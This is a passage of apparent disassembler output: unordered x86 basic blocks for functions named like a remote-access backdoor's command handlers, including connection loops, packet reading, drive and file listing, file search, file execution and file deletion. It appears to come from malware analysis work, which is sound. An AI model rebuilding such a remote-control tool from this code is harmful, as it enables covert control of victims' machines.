0x804ea85:	mov	eax, ebx
0x804ea87:	pop	ebx
0x804ea88:	pop	esi
0x804ea89:	pop	edi
0x804ea8a:	pop	ebp
0x804ea8b:	ret	
None
|
|
|
v
0x804ea5b:	push	esi
0x804ea5c:	push	0x10
0x804ea5e:	push	edi
0x804ea5f:	push	eax
0x804ea60:	call	0x804bf80
None
|
|
|
v
0x804e967:	mov	eax, dword ptr [0x805b9c4]
0x804e96c:	mov	eax, dword ptr [eax + 0x88]
0x804e972:	mov	dword ptr [0x805b9c4], eax
0x804e977:	jmp	0x804e981
None
|
|
|
v
0x804e8fd:	jmp	0x804e93d
None
|
|
|
v
0x804e9ec:	add	esp, 0x10
0x804e9ef:	test	al, al
0x804e9f1:	jne	0x804ea7e
None
|
|
|
v
0x804ea2c:	push	eax
0x804ea2d:	lea	edi, dword ptr [esp + 0x10]
0x804ea31:	push	edi
0x804ea32:	push	esi
0x804ea33:	push	ebx
0x804ea34:	or	ebx, 0xffffffff
0x804ea37:	call	0x804e020
None
|
|
|
v
0x804e979:	lea	edi, dword ptr [esp + 0xc]
0x804e97d:	lea	ebp, dword ptr [esp + 0x1c]
0x804e981:	mov	eax, dword ptr [0x805b9c4]
0x804e986:	test	eax, eax
0x804e988:	jne	0x804e89a
None
|
|
|
v
0x804e8f6:	add	esp, 0x10
0x804e8f9:	test	al, al
0x804e8fb:	je	0x804e95b
None
|
|
|
v
0x804e956:	jmp	0x804ea7e
None
|
|
|
v
0x804e9a3:	push	edx
0x804e9a4:	push	edi
0x804e9a5:	push	dword ptr [eax + 0x44]
0x804e9a8:	add	eax, 4
0x804e9ab:	push	eax
0x804e9ac:	call	0x804e020
None
|
|
|
v
0x804e9a1:	jmp	0x804ea15
None
|
|
|
v
0x804e981:	mov	eax, dword ptr [0x805b9c4]
0x804e986:	test	eax, eax
0x804e988:	jne	0x804e89a
None
|
|
|
v
0x804ea65:	add	esp, 0x10
0x804ea68:	test	eax, eax
0x804ea6a:	je	0x804ea7e
None
|
|
|
v
0x804e8da:	mov	eax, dword ptr [0x805b9c4]
0x804e8df:	mov	edx, dword ptr [eax + 0x88]
0x804e8e5:	push	dword ptr [edx + 0x44]
0x804e8e8:	add	edx, 4
0x804e8eb:	push	edx
0x804e8ec:	push	eax
0x804e8ed:	push	dword ptr [esp + 0x28]
0x804e8f1:	call	0x804e5a8
None
|
|
|
v
0x804e935:	add	esp, 0x10
0x804e938:	jmp	0x804ea82
None
|
|
|
v
0x804ea82:	add	esp, 0x2c
0x804ea85:	mov	eax, ebx
0x804ea87:	pop	ebx
0x804ea88:	pop	esi
0x804ea89:	pop	edi
0x804ea8a:	pop	ebp
0x804ea8b:	ret	
None
|
|
|
v
0x804e914:	push	eax
0x804e915:	push	dword ptr [esp + 0x28]
0x804e919:	call	0x804e5a8
None
|
|
|
v
0x804e9d4:	add	esp, 0x10
0x804e9d7:	test	eax, eax
0x804e9d9:	jne	0x804e9f7
None
|
|
|
v
0x804e8cf:	add	esp, 0x10
0x804e8d2:	test	eax, eax
0x804e8d4:	jne	0x804e95b
None
|
|
|
v
0x804e93d:	mov	eax, dword ptr [0x805b9c4]
0x804e942:	mov	eax, dword ptr [eax + 0x88]
0x804e948:	mov	dword ptr [0x805b9c4], eax
0x804e94d:	mov	eax, dword ptr [0x805b9c4]
0x804e952:	test	eax, eax
0x804e954:	jne	0x804e8ff
None
|
|
|
v
0x804e964:	add	esp, 0x10
0x804e967:	mov	eax, dword ptr [0x805b9c4]
0x804e96c:	mov	eax, dword ptr [eax + 0x88]
0x804e972:	mov	dword ptr [0x805b9c4], eax
0x804e977:	jmp	0x804e981
None
|
|
|
v
0x804ea00:	add	esp, 0x10
0x804ea03:	mov	eax, dword ptr [0x805b9c4]
0x804ea08:	mov	eax, dword ptr [eax + 0x88]
0x804ea0e:	mov	dword ptr [0x805b9c4], eax
0x804ea13:	jmp	0x804ea1d
None
|
|
|
v
0x804e9f7:	sub	esp, 0xc
0x804e9fa:	push	ebp
0x804e9fb:	call	0x804e827
None
|
|
|
v
0x804ea4f:	mov	dword ptr [esp + 0x2c], eax
0x804ea53:	add	esp, 0x10
0x804ea56:	cmp	eax, 0xff
0x804ea59:	je	0x804ea82
None
|
|
|
v
0x804ea79:	add	esp, 0x10
0x804ea7c:	jmp	0x804ea82
None
|
|
|
v
0x804e8a8:	add	esp, 0x10
0x804e8ab:	test	al, al
0x804e8ad:	je	0x804e967
None
|
|
|
v
0x804e9b1:	add	esp, 0x10
0x804e9b4:	test	al, al
0x804e9b6:	je	0x804ea03
None
|
|
|
v
0x804e909:	push	dword ptr [edx + 0x44]
0x804e90c:	add	edx, 4
0x804e90f:	push	edx
0x804e910:	jmp	0x804e914
None
|
|
|
v
0x804e993:	call	0x80530cc
None
|
|
|
v
0x804e875:	cmp	eax, 4
0x804e878:	jne	0x804e993
None
|
|
|
v
0x804ea03:	mov	eax, dword ptr [0x805b9c4]
0x804ea08:	mov	eax, dword ptr [eax + 0x88]
0x804ea0e:	mov	dword ptr [0x805b9c4], eax
0x804ea13:	jmp	0x804ea1d
None
|
|
|
v
0x804e9db:	push	esi
0x804e9dc:	push	ebx
0x804e9dd:	push	dword ptr [0x805b9c4]
0x804e9e3:	push	dword ptr [esp + 0x28]
0x804e9e7:	call	0x804e5a8
None
|
|
|
v
0x804e8ff:	mov	edx, dword ptr [eax + 0x88]
0x804e905:	test	edx, edx
0x804e907:	je	0x804e912
None
|
|
|
v
0x804e88b:	mov	eax, dword ptr [0x805b9c8]
0x804e890:	mov	dword ptr [0x805b9c4], eax
0x804e895:	jmp	0x804e979
None
|
|
|
v
0x804ea3c:	add	esp, 0x10
0x804ea3f:	test	al, al
0x804ea41:	je	0x804ea82
None
|
|
|
v
0x804e91e:	add	esp, 0x10
0x804e921:	test	al, al
0x804e923:	jne	0x804e93d
None
|
|
|
v
0x804e87e:	cmp	dword ptr [0x805b9c4], 0
0x804e885:	jne	0x804e979
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:EstablishConnectionLoop
TOTAL BLOCKS :7
0x804ea9f:	add	esp, 0x10
0x804eaa2:	cmp	eax, 0xff
0x804eaa5:	jne	0x804eac6
None
|
|
|
v
0x804eaa7:	mov	eax, dword ptr [0x805b9cc]
0x804eaac:	sub	esp, 0xc
0x804eaaf:	mov	eax, dword ptr [eax + 0x44]
0x804eab2:	push	0x1f40
0x804eab7:	mov	dword ptr [0x805b9cc], eax
0x804eabc:	call	0x804f548
None
|
|
|
v
0x804ea8c:	sub	esp, 0x1c
0x804ea8f:	mov	eax, dword ptr [0x805b9cc]
0x804ea94:	push	edx
0x804ea95:	push	edx
0x804ea96:	push	dword ptr [eax + 0x40]
0x804ea99:	push	eax
0x804ea9a:	call	0x804e859
None
|
|
|
v
0x804eac1:	add	esp, 0x10
0x804eac4:	jmp	0x804ea8f
None
|
|
|
v
0x804ead4:	mov	eax, dword ptr [esp + 0x1c]
0x804ead8:	add	esp, 0x2c
0x804eadb:	ret	
None
|
|
|
v
0x804ea8f:	mov	eax, dword ptr [0x805b9cc]
0x804ea94:	push	edx
0x804ea95:	push	edx
0x804ea96:	push	dword ptr [eax + 0x40]
0x804ea99:	push	eax
0x804ea9a:	call	0x804e859
None
|
|
|
v
0x804eac6:	push	ecx
0x804eac7:	push	ecx
0x804eac8:	push	3
0x804eaca:	push	eax
0x804eacb:	mov	dword ptr [esp + 0x1c], eax
0x804eacf:	call	0x804e069
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:IsSocketReadable
TOTAL BLOCKS :15
0x804eb59:	sub	esp, 0xc
0x804eb5c:	lea	eax, dword ptr [esp + 0xbc]
0x804eb63:	push	eax
0x804eb64:	call	0x804e827
None
|
|
|
v
0x804eb70:	call	0x804be50
None
|
|
|
v
0x804eb53:	add	esp, 0x10
0x804eb56:	inc	eax
0x804eb57:	jne	0x804eaf1
None
|
|
|
v
0x804eb75:	cmp	dword ptr [eax], 4
0x804eb78:	je	0x804eaf1
None
|
|
|
v
0x804eb97:	add	esp, 0x9c
0x804eb9d:	pop	ebx
0x804eb9e:	pop	esi
0x804eb9f:	pop	edi
0x804eba0:	pop	ebp
0x804eba1:	ret	
None
|
|
|
v
0x804eaff:	mov	ecx, dword ptr [esp + 0xb0]
0x804eb06:	mov	al, 1
0x804eb08:	mov	dword ptr [esp + 0x88], 0xa
0x804eb13:	mov	dword ptr [esp + 0x8c], 0
0x804eb1e:	mov	edx, ecx
0x804eb20:	shr	edx, 5
0x804eb23:	shl	eax, cl
0x804eb25:	inc	ecx
0x804eb26:	or	dword ptr [esp + edx*4 + 8], eax
0x804eb2a:	sub	esp, 0xc
0x804eb2d:	push	esi
0x804eb2e:	push	0
0x804eb30:	push	0
0x804eb32:	push	ebx
0x804eb33:	push	ecx
0x804eb34:	call	0x804bc00
None
|
|
|
v
0x804eb41:	push	0
0x804eb43:	push	0
0x804eb45:	push	2
0x804eb47:	push	dword ptr [esp + 0xbc]
0x804eb4e:	call	0x804e62a
None
|
|
|
v
0x804eb82:	mov	eax, dword ptr [esp + 0xb0]
0x804eb89:	cdq	
0x804eb8a:	idiv	ebp
0x804eb8c:	mov	eax, dword ptr [esp + eax*4 + 8]
0x804eb90:	mov	cl, dl
0x804eb92:	sar	eax, cl
0x804eb94:	and	eax, 1
0x804eb97:	add	esp, 0x9c
0x804eb9d:	pop	ebx
0x804eb9e:	pop	esi
0x804eb9f:	pop	edi
0x804eba0:	pop	ebp
0x804eba1:	ret	
None
|
|
|
v
0x804eafd:	rep stosd	dword ptr es:[edi], eax
None
|
|
|
v
0x804eadc:	push	ebp
0x804eadd:	push	edi
0x804eade:	push	esi
0x804eadf:	push	ebx
0x804eae0:	sub	esp, 0x9c
0x804eae6:	lea	ebx, dword ptr [esp + 8]
0x804eaea:	lea	esi, dword ptr [esp + 0x88]
0x804eaf1:	mov	ebp, 0x20
0x804eaf6:	mov	edi, ebx
0x804eaf8:	mov	ecx, ebp
0x804eafa:	xor	eax, eax
0x804eafc:	cld	
0x804eafd:	rep stosd	dword ptr es:[edi], eax
None
|
|
|
v
0x804eb7e:	xor	eax, eax
0x804eb80:	jmp	0x804eb97
None
|
|
|
v
0x804eb69:	add	esp, 0x10
0x804eb6c:	jmp	0x804eaf1
None
|
|
|
v
0x804eb39:	add	esp, 0x20
0x804eb3c:	cmp	eax, 0
0x804eb3f:	jne	0x804eb6e
None
|
|
|
v
0x804eb6e:	jge	0x804eb82
None
|
|
|
v
0x804eaf1:	mov	ebp, 0x20
0x804eaf6:	mov	edi, ebx
0x804eaf8:	mov	ecx, ebp
0x804eafa:	xor	eax, eax
0x804eafc:	cld	
0x804eafd:	rep stosd	dword ptr es:[edi], eax
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:ReadPacket
TOTAL BLOCKS :6
0x804ebb1:	sub	esp, 0xc
0x804ebb4:	push	ebx
0x804ebb5:	call	0x804eadc
None
|
|
|
v
0x804ebc1:	push	0
0x804ebc3:	push	dword ptr [esp + 0x1c]
0x804ebc7:	push	dword ptr [esp + 0x1c]
0x804ebcb:	push	ebx
0x804ebcc:	call	0x804bfa0
None
|
|
|
v
0x804ebd1:	add	esp, 0x10
0x804ebd4:	mov	esi, eax
0x804ebd6:	mov	eax, esi
0x804ebd8:	pop	ecx
0x804ebd9:	pop	ebx
0x804ebda:	pop	esi
0x804ebdb:	ret	
None
|
|
|
v
0x804ebba:	add	esp, 0x10
0x804ebbd:	test	al, al
0x804ebbf:	je	0x804ebd6
None
|
|
|
v
0x804ebd6:	mov	eax, esi
0x804ebd8:	pop	ecx
0x804ebd9:	pop	ebx
0x804ebda:	pop	esi
0x804ebdb:	ret	
None
|
|
|
v
0x804eba2:	push	esi
0x804eba3:	or	esi, 0xffffffff
0x804eba6:	push	ebx
0x804eba7:	push	ebx
0x804eba8:	mov	ebx, dword ptr [esp + 0x10]
0x804ebac:	cmp	ebx, 0xff
0x804ebaf:	je	0x804ebd6
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:cpListDrives
TOTAL BLOCKS :2
0x804ebdc:	sub	esp, 0xc
0x804ebdf:	push	0
0x804ebe1:	push	0
0x804ebe3:	push	0xa
0x804ebe5:	push	dword ptr [esp + 0x1c]
0x804ebe9:	call	0x804e62a
None
|
|
|
v
0x804ebee:	add	esp, 0x1c
0x804ebf1:	ret	
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:cpListFiles
TOTAL BLOCKS :31
0x804ed9e:	sub	esp, 0xc
0x804eda1:	push	dword ptr [esp + 0x18]
0x804eda5:	call	0x804bef0
None
|
|
|
v
0x804ec3d:	lea	ebp, dword ptr [edi + 0x13]
0x804ec40:	push	eax
0x804ec41:	push	ebp
0x804ec42:	push	dword ptr [esp + 0x11cc]
0x804ec49:	push	0x8056090
0x804ec4e:	push	0x1100
0x804ec53:	push	1
0x804ec55:	push	0x1100
0x804ec5a:	lea	eax, dword ptr [esp + 0x2c]
0x804ec5e:	push	eax
0x804ec5f:	call	0x804bb70
None
|
|
|
v
0x804ecf0:	xor	eax, eax
0x804ecf2:	cmp	byte ptr [edi + 0x13], 0x2e
0x804ecf6:	push	ecx
0x804ecf7:	push	ecx
0x804ecf8:	push	edx
0x804ecf9:	sete	al
0x804ecfc:	push	ebp
0x804ecfd:	lea	eax, dword ptr [eax + eax + 0x10]
0x804ed01:	push	eax
0x804ed02:	push	0x80560b1
0x804ed07:	push	1
0x804ed09:	lea	ebp, dword ptr [esp + 0x11ac]
0x804ed10:	push	ebp
0x804ed11:	call	0x804bd20
None
|
|
|
v
0x804ede1:	mov	dword ptr [esp + 0x11bc], eax
0x804ede8:	add	esp, 0x20
0x804edeb:	test	eax, eax
0x804eded:	je	0x804ee11
None
|
|
|
v
0x804edc3:	mov	dword ptr [esp], 1
0x804edca:	push	ebx
0x804edcb:	lea	eax, dword ptr [esp + 0x11ac]
0x804edd2:	push	eax
0x804edd3:	push	esi
0x804edd4:	lea	eax, dword ptr [esp + 0x11b0]
0x804eddb:	push	eax
0x804eddc:	call	0x8051f2f
None
|
|
|
v
0x804ed37:	mov	dword ptr [esp + 0x11b4], eax
0x804ed3e:	jmp	0x804ed95
None
|
|
|
v
0x804edef:	add	ebx, esi
0x804edf1:	push	ebx
0x804edf2:	push	eax
0x804edf3:	push	0xc
0x804edf5:	push	dword ptr [esp + 0x11cc]
0x804edfc:	call	0x804e62a
None
|
|
|
v
0x804ed9a:	xor	ebx, ebx
0x804ed9c:	xor	esi, esi
0x804ed9e:	sub	esp, 0xc
0x804eda1:	push	dword ptr [esp + 0x18]
0x804eda5:	call	0x804bef0
None
|
|
|
v
0x804ebf2:	push	ebp
0x804ebf3:	push	edi
0x804ebf4:	push	esi
0x804ebf5:	push	ebx
0x804ebf6:	sub	esp, 0x11b8
0x804ebfc:	mov	dword ptr [esp + 0x119c], 0
0x804ec07:	mov	dword ptr [esp + 0x11a0], 0
0x804ec12:	mov	dword ptr [esp + 0x11a4], 0
0x804ec1d:	push	dword ptr [esp + 0x11d0]
0x804ec24:	call	0x804bfd0
None
|
|
|
v
0x804ec64:	add	esp, 0x20
0x804ec67:	inc	eax
0x804ec68:	je	0x804ed9e
None
|
|
|
v
0x804ee01:	pop	eax
0x804ee02:	lea	eax, dword ptr [esp + 0x11a8]
0x804ee09:	push	eax
0x804ee0a:	call	0x804f57c
None
|
|
|
v
0x804ee23:	add	esp, 0x11bc
0x804ee29:	pop	ebx
0x804ee2a:	pop	esi
0x804ee2b:	pop	edi
0x804ee2c:	pop	ebp
0x804ee2d:	ret	
None
|
|
|
v
0x804ec8d:	sub	esp, 0xc
0x804ec90:	lea	eax, dword ptr [esp + 0x1164]
0x804ec97:	push	eax
0x804ec98:	call	0x804be20
None
|
|
|
v
0x804ed95:	add	esp, 0x20
0x804ed98:	jmp	0x804ed9e
None
|
|
|
v
0x804edb7:	sub	esp, 0xc
0x804edba:	push	dword ptr [esp + 0x18]
0x804edbe:	call	0x804bfc0
None
|
|
|
v
0x804ec6e:	push	eax
0x804ec6f:	push	eax
0x804ec70:	lea	eax, dword ptr [esp + 0x1118]
0x804ec77:	push	eax
0x804ec78:	lea	eax, dword ptr [esp + 0x1c]
0x804ec7c:	push	eax
0x804ec7d:	call	0x8055e50
None
|
|
|
v
0x804ed16:	add	esp, 0x20
0x804ed19:	cmp	eax, 0xff
0x804ed1c:	mov	edi, eax
0x804ed1e:	je	0x804ed9e
None
|
|
|
v
0x804ed6d:	add	esp, 0x20
0x804ed70:	cmp	eax, 0xff
0x804ed73:	mov	edi, eax
0x804ed75:	je	0x804ed9e
None
|
|
|
v
0x804ec29:	mov	dword ptr [esp + 0x1c], eax
0x804ec2d:	add	esp, 0x10
0x804ec30:	test	eax, eax
0x804ec32:	jne	0x804ed9a
None
|
|
|
v
0x804ed47:	push	edx
0x804ed48:	push	dword ptr [esp + 0x1144]
0x804ed4f:	push	dword ptr [esp + 0x1144]
0x804ed56:	push	ebp
0x804ed57:	push	0
0x804ed59:	push	0x80560bb
0x804ed5e:	push	1
0x804ed60:	lea	ebp, dword ptr [esp + 0x11ac]
0x804ed67:	push	ebp
0x804ed68:	call	0x804bd20
None
|
|
|
v
0x804ecd6:	mov	eax, dword ptr [esp + 0x1150]
0x804ecdd:	add	esp, 0x30
0x804ece0:	mov	edx, dword ptr [esp + 8]
0x804ece4:	and	eax, 0xf000
0x804ece9:	cmp	eax, 0x4000
0x804ecee:	jne	0x804ed40
None
|
|
|
v
0x804ec38:	jmp	0x804ee11
None
|
|
|
v
0x804ed77:	sub	esp, 0xc
0x804ed7a:	push	1
0x804ed7c:	push	eax
0x804ed7d:	push	ebp
0x804ed7e:	push	ebx
0x804ed7f:	add	ebx, edi
0x804ed81:	lea	eax, dword ptr [esp + 0x11b4]
0x804ed88:	push	eax
0x804ed89:	call	0x8051f2f
None
|
|
|
v
0x804ed40:	cmp	eax, 0x8000
0x804ed45:	jne	0x804ed9e
None
|
|
|
v
0x804ec9d:	add	esp, 0xc
0x804eca0:	push	dword ptr [eax]
0x804eca2:	push	dword ptr [eax + 4]
0x804eca5:	push	dword ptr [eax + 8]
0x804eca8:	mov	edx, dword ptr [eax + 0x14]
0x804ecab:	add	edx, 0x76c
0x804ecb1:	push	edx
0x804ecb2:	mov	edx, dword ptr [eax + 0x10]
0x804ecb5:	inc	edx
0x804ecb6:	push	edx
0x804ecb7:	push	dword ptr [eax + 0xc]
0x804ecba:	push	0x8056095
0x804ecbf:	push	0x20
0x804ecc1:	push	1
0x804ecc3:	push	0x20
0x804ecc5:	lea	edx, dword ptr [esp + 0x119c]
0x804eccc:	push	edx
0x804eccd:	mov	dword ptr [esp + 0x38], edx
0x804ecd1:	call	0x804bb70
None
|
|
|
v
0x804ee11:	push	0
0x804ee13:	push	0
0x804ee15:	push	0xd
0x804ee17:	push	dword ptr [esp + 0x11cc]
0x804ee1e:	call	0x804e62a
None
|
|
|
v
0x804ee0f:	jmp	0x804ee23
None
|
|
|
v
0x804edaa:	add	esp, 0x10
0x804edad:	test	eax, eax
0x804edaf:	mov	edi, eax
0x804edb1:	jne	0x804ec3d
None
|
|
|
v
0x804ec82:	add	esp, 0x10
0x804ec85:	test	eax, eax
0x804ec87:	jne	0x804ed9e
None
|
|
|
v
0x804ed8e:	mov	dword ptr [esp + 0x11b8], eax
0x804ed95:	add	esp, 0x20
0x804ed98:	jmp	0x804ed9e
None
|
|
|
v
0x804ed20:	sub	esp, 0xc
0x804ed23:	push	1
0x804ed25:	push	eax
0x804ed26:	push	ebp
0x804ed27:	push	esi
0x804ed28:	add	esi, edi
0x804ed2a:	lea	eax, dword ptr [esp + 0x11b0]
0x804ed31:	push	eax
0x804ed32:	call	0x8051f2f
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:cpSearchFiles
TOTAL BLOCKS :41
0x804f066:	add	esp, 0x10
0x804f069:	mov	eax, dword ptr [esp + 0x3290]
0x804f070:	cmp	dword ptr [eax + 0x2100], 0
0x804f077:	jne	0x804f09b
None
|
|
|
v
0x804ee61:	lea	ebx, dword ptr [eax + 0x13]
0x804ee64:	push	eax
0x804ee65:	push	eax
0x804ee66:	push	0x80560cb
0x804ee6b:	push	ebx
0x804ee6c:	call	0x804bb90
None
|
|
|
v
0x804ee71:	add	esp, 0x10
0x804ee74:	test	eax, eax
0x804ee76:	je	0x804f040
None
|
|
|
v
0x804f02d:	add	esp, 0x10
0x804f030:	jmp	0x804f040
None
|
|
|
v
0x804ef90:	push	eax
0x804ef91:	push	dword ptr [esp + 0x3270]
0x804ef98:	push	0x1b
0x804ef9a:	mov	eax, dword ptr [esp + 0x329c]
0x804efa1:	push	dword ptr [eax + 0x2104]
0x804efa7:	call	0x804e62a
None
|
|
|
v
0x804ef84:	add	esp, 0x20
0x804ef87:	cmp	eax, 0xff
0x804ef8a:	je	0x804f040
None
|
|
|
v
0x804f09b:	add	esp, 0x327c
0x804f0a1:	pop	ebx
0x804f0a2:	pop	esi
0x804f0a3:	pop	edi
0x804f0a4:	pop	ebp
0x804f0a5:	ret	
None
|
|
|
v
0x804ef58:	push	dword ptr [esp + 0x3290]
0x804ef5f:	push	dword ptr [esp + 0x3240]
0x804ef66:	push	dword ptr [esp + 0x3240]
0x804ef6d:	push	ebx
0x804ef6e:	push	0
0x804ef70:	push	0x80560bb
0x804ef75:	push	1
0x804ef77:	lea	eax, dword ptr [esp + 0x3288]
0x804ef7e:	push	eax
0x804ef7f:	call	0x804bd20
None
|
|
|
v
0x804ee7c:	push	eax
0x804ee7d:	push	eax
0x804ee7e:	push	0x80560ca
0x804ee83:	push	ebx
0x804ee84:	call	0x804bb90
None
|
|
|
v
0x804efba:	add	esp, 0x10
0x804efbd:	mov	eax, dword ptr [esp + 0x321c]
0x804efc4:	and	eax, 0xf000
0x804efc9:	cmp	eax, 0x4000
0x804efce:	jne	0x804f040
None
|
|
|
v
0x804eef1:	mov	eax, dword ptr [esp + 0x321c]
0x804eef8:	and	eax, 0xf000
0x804eefd:	cmp	eax, 0x4000
0x804ef02:	jne	0x804ef51
None
|
|
|
v
0x804eed1:	push	edx
0x804eed2:	push	edx
0x804eed3:	push	ebx
0x804eed4:	mov	eax, dword ptr [esp + 0x329c]
0x804eedb:	add	eax, 0x1100
0x804eee0:	push	eax
0x804eee1:	call	0x80520a8
None
|
|
|
v
0x804eee6:	add	esp, 0x10
0x804eee9:	test	al, al
0x804eeeb:	je	0x804efbd
None
|
|
|
v
0x804ef30:	push	eax
0x804ef31:	push	dword ptr [esp + 0x3270]
0x804ef38:	push	0x1b
0x804ef3a:	mov	eax, dword ptr [esp + 0x329c]
0x804ef41:	push	dword ptr [eax + 0x2104]
0x804ef47:	call	0x804e62a
None
|
|
|
v
0x804f098:	add	esp, 0x10
0x804f09b:	add	esp, 0x327c
0x804f0a1:	pop	ebx
0x804f0a2:	pop	esi
0x804f0a3:	pop	edi
0x804f0a4:	pop	ebp
0x804f0a5:	ret	
None
|
|
|
v
0x804f069:	mov	eax, dword ptr [esp + 0x3290]
0x804f070:	cmp	dword ptr [eax + 0x2100], 0
0x804f077:	jne	0x804f09b
None
|
|
|
v
0x804ee89:	add	esp, 0x10
0x804ee8c:	test	eax, eax
0x804ee8e:	je	0x804f040
None
|
|
|
v
0x804f040:	sub	esp, 0xc
0x804f043:	push	esi
0x804f044:	call	0x804bef0
None
|
|
|
v
0x804f050:	cmp	dword ptr [0x805b9f0], 0
0x804f057:	jne	0x804ee61
None
|
|
|
v
0x804f003:	mov	eax, dword ptr [esp + 0x32a0]
0x804f00a:	mov	edx, dword ptr [eax + 0x2100]
0x804f010:	mov	eax, dword ptr [eax + 0x2104]
0x804f016:	mov	dword ptr [esp], ebx
0x804f019:	inc	edx
0x804f01a:	mov	dword ptr [esp + 0x2114], edx
0x804f021:	mov	dword ptr [esp + 0x2118], eax
0x804f028:	call	0x804ee2e
None
|
|
|
v
0x804f032:	lea	edi, dword ptr [esp + 0x210c]
0x804f039:	lea	ebp, dword ptr [esp + 0x320c]
0x804f040:	sub	esp, 0xc
0x804f043:	push	esi
0x804f044:	call	0x804bef0
None
|
|
|
v
0x804ee4f:	add	esp, 0x10
0x804ee52:	test	eax, eax
0x804ee54:	mov	esi, eax
0x804ee56:	jne	0x804f032
None
|
|
|
v
0x804f079:	push	0
0x804f07b:	push	0
0x804f07d:	push	0x1a
0x804f07f:	push	dword ptr [eax + 0x2104]
0x804f085:	call	0x804e62a
None
|
|
|
v
0x804ef51:	cmp	eax, 0x8000
0x804ef56:	jne	0x804efbd
None
|
|
|
v
0x804f05d:	sub	esp, 0xc
0x804f060:	push	esi
0x804f061:	call	0x804bfc0
None
|
|
|
v
0x804eebe:	push	ecx
0x804eebf:	push	ecx
0x804eec0:	push	ebp
0x804eec1:	push	edi
0x804eec2:	call	0x8055e50
None
|
|
|
v
0x804efb5:	call	0x804f57c
None
|
|
|
v
0x804ee94:	push	eax
0x804ee95:	push	ebx
0x804ee96:	push	dword ptr [esp + 0x3298]
0x804ee9d:	push	0x80560cd
0x804eea2:	push	0x1100
0x804eea7:	push	1
0x804eea9:	push	0x1100
0x804eeae:	push	edi
0x804eeaf:	call	0x804bb70
None
|
|
|
v
0x804ef4c:	mov	dword ptr [esp], ebx
0x804ef4f:	jmp	0x804efb5
None
|
|
|
v
0x804ef24:	add	esp, 0x20
0x804ef27:	cmp	eax, 0xff
0x804ef2a:	je	0x804f040
None
|
|
|
v
0x804eff4:	add	esp, 0xc
0x804eff7:	push	0x1100
0x804effc:	push	edi
0x804effd:	push	ebx
0x804effe:	call	0x8051ce0
None
|
|
|
v
0x804ee5c:	jmp	0x804f069
None
|
|
|
v
0x804efac:	pop	eax
0x804efad:	lea	eax, dword ptr [esp + 0x3278]
0x804efb4:	push	eax
0x804efb5:	call	0x804f57c
None
|
|
|
v
0x804efd0:	push	eax
0x804efd1:	push	0x1000
0x804efd6:	mov	eax, dword ptr [esp + 0x3298]
0x804efdd:	add	eax, 0x1100
0x804efe2:	push	eax
0x804efe3:	lea	eax, dword ptr [esp + 0x1110]
0x804efea:	lea	ebx, dword ptr [esp + 0x10]
0x804efee:	push	eax
0x804efef:	call	0x8051ce0
None
|
|
|
v
0x804efbd:	mov	eax, dword ptr [esp + 0x321c]
0x804efc4:	and	eax, 0xf000
0x804efc9:	cmp	eax, 0x4000
0x804efce:	jne	0x804f040
None
|
|
|
v
0x804eeb4:	add	esp, 0x20
0x804eeb7:	inc	eax
0x804eeb8:	je	0x804f040
None
|
|
|
v
0x804ee2e:	push	ebp
0x804ee2f:	push	edi
0x804ee30:	push	esi
0x804ee31:	push	ebx
0x804ee32:	sub	esp, 0x3288
0x804ee38:	mov	dword ptr [esp + 0x3278], 0
0x804ee43:	push	dword ptr [esp + 0x329c]
0x804ee4a:	call	0x804bfd0
None
|
|
|
v
0x804f08a:	pop	eax
0x804f08b:	lea	eax, dword ptr [esp + 0x329c]
0x804f092:	push	eax
0x804f093:	call	0x804f57c
None
|
|
|
v
0x804eec7:	add	esp, 0x10
0x804eeca:	inc	eax
0x804eecb:	je	0x804f040
None
|
|
|
v
0x804ef04:	push	eax
0x804ef05:	push	eax
0x804ef06:	push	dword ptr [esp + 0x3298]
0x804ef0d:	push	ebx
0x804ef0e:	push	0x10
0x804ef10:	push	0x80560b1
0x804ef15:	push	1
0x804ef17:	lea	ebx, dword ptr [esp + 0x3288]
0x804ef1e:	push	ebx
0x804ef1f:	call	0x804bd20
None
|
|
|
v
0x804f049:	add	esp, 0x10
0x804f04c:	test	eax, eax
0x804f04e:	je	0x804f05d
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:cpExecuteFile
TOTAL BLOCKS :10
0x804f0a6:	push	esi
0x804f0a7:	push	ebx
0x804f0a8:	push	eax
0x804f0a9:	mov	eax, dword ptr [esp + 0x18]
0x804f0ad:	mov	ebx, dword ptr [esp + 0x10]
0x804f0b1:	mov	esi, dword ptr [esp + 0x14]
0x804f0b5:	test	eax, eax
0x804f0b7:	je	0x804f0be
None
|
|
|
v
0x804f0e6:	mov	dword ptr [esp + 0x20], ebx
0x804f0ea:	mov	dword ptr [esp + 0x24], eax
0x804f0ee:	add	esp, 0x14
0x804f0f1:	pop	ebx
0x804f0f2:	pop	esi
0x804f0f3:	jmp	0x804bf30
None
|
|
|
v
0x804f0c7:	push	eax
0x804f0c8:	push	0
0x804f0ca:	push	esi
0x804f0cb:	push	ebx
0x804f0cc:	call	0x804be60
None
|
|
|
v
0x804f0d1:	mov	dword ptr [esp], 0
0x804f0d8:	call	0x804bd80
None
|
|
|
v
0x804f0dd:	sub	esp, 0xc
0x804f0e0:	push	esi
0x804f0e1:	call	0x8051de0
None
|
|
|
v
0x804f0f8:	pop	eax
0x804f0f9:	pop	ebx
0x804f0fa:	pop	esi
0x804f0fb:	ret	
None
|
|
|
v
0x804f0bc:	jmp	0x804f0dd
None
|
|
|
v
0x804f0be:	call	0x804bea0
None
|
|
|
v
0x804f0b9:	dec	eax
0x804f0ba:	jne	0x804f0f8
None
|
|
|
v
0x804f0c3:	test	eax, eax
0x804f0c5:	jne	0x804f0f8
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:cpDeleteFile
TOTAL BLOCKS :2
0x804f108:	test	eax, eax
0x804f10a:	sete	al
0x804f10d:	add	esp, 0x1c
0x804f110:	ret	
None
|
|
|
v
0x804f0fc:	sub	esp, 0x18
0x804f0ff:	push	dword ptr [esp + 0x1c]
0x804f103:	call	0x804bee0
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
